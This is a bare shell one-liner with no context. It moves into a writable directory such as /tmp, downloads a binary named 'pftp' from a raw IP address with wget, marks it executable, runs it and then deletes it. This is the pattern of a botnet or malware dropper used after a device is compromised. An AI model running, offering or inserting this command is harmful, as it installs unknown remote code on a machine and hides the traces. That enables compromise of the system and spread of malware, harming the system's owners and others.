cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.9.77.253/pftp; chmod +x pftp; ./pftp; rm -rf pftp
